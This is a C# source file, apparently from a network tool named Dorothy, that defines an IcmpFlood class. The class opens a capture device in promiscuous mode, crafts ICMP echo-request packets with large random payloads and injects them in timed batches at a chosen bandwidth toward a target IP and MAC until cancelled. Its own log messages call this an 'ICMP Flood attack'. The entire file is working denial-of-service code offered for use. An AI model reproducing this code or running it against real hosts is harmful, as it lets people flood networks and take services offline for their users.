using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using PacketProtocolType = PacketDotNet.ProtocolType;

namespace Dorothy.Models
{
    public class IcmpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly string _sourceIp;
        private readonly PhysicalAddress _sourceMac;
        private readonly string _targetIp;
        private readonly byte[] _targetMac;
        private readonly byte[] _gatewayMac;
        private readonly long _bytesPerSecond;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public IcmpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, byte[] gatewayMac, long bytesPerSecond, CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp;
            _sourceMac = new PhysicalAddress(sourceMac);
            _targetIp = targetIp;
            _targetMac = targetMac;
            _gatewayMac = gatewayMac;
            _bytesPerSecond = bytesPerSecond;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting ICMP Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var ethernetPacket = new EthernetPacket(
                    _sourceMac,
                    new PhysicalAddress(_targetMac),
                    EthernetType.IPv4);

                var ipPacket = new IPv4Packet(
                    IPAddress.Parse(_sourceIp),
                    IPAddress.Parse(_targetIp))
                {
                    Protocol = ProtocolType.Icmp,
                    TimeToLive = 128
                };

                var icmpData = new byte[1400]; // Increased payload size
                new Random().NextBytes(icmpData); // Random payload
                var icmpPacket = new IcmpV4Packet(new PacketDotNet.Utils.ByteArraySegment(icmpData))
                {
                    TypeCode = IcmpV4TypeCode.EchoRequest
                };

                ipPacket.PayloadPacket = icmpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                double packetSize = ethernetPacket.Bytes.Length;
                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
                int batchSize = 100;
                double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;

                Logger.Info($"ICMP Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");

                await Task.Run(() =>
                {
                    var stopwatch = new System.Diagnostics.Stopwatch();
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            stopwatch.Restart();
                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                            {
                                injectionDevice.SendPacket(ethernetPacket);
                            }

                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
                            if (elapsedMicroseconds < delayMicroseconds)
                            {
                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
                                if (remainingMicroseconds > 1000)
                                {
                                    Thread.Sleep(remainingMicroseconds / 1000);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed to send ICMP packet.");
                        }
                    }
                    return Task.CompletedTask;
                }, _cancellationToken);
            }
            catch (TaskCanceledException)
            {
                Logger.Info("ICMP Flood attack was canceled.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "ICMP Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
                Logger.Info("ICMP Flood attack stopped.");
            }
        }

        public void Dispose()
        {
            _device?.Dispose();
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
    }
} 